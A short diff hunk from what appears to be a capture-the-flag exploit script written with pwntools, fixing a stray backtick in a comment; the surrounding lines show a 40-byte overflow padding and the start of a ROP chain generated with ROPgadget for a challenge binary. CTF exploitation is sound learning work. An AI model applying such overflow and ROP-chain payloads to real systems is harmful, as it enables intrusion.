@@ -12,7 +12,7 @@ context.arch = "amd64"
 payload = flat(
     b'A'*40,
 
-    # below generated with `ROPgadget --binary pwn110.pwn110 --ropchain``
+    # below generated with `ROPgadget --binary pwn110.pwn110 --ropchain`
 
     0x40f4de, # pop rsi ; ret
     0x4c00e0, # @ .data
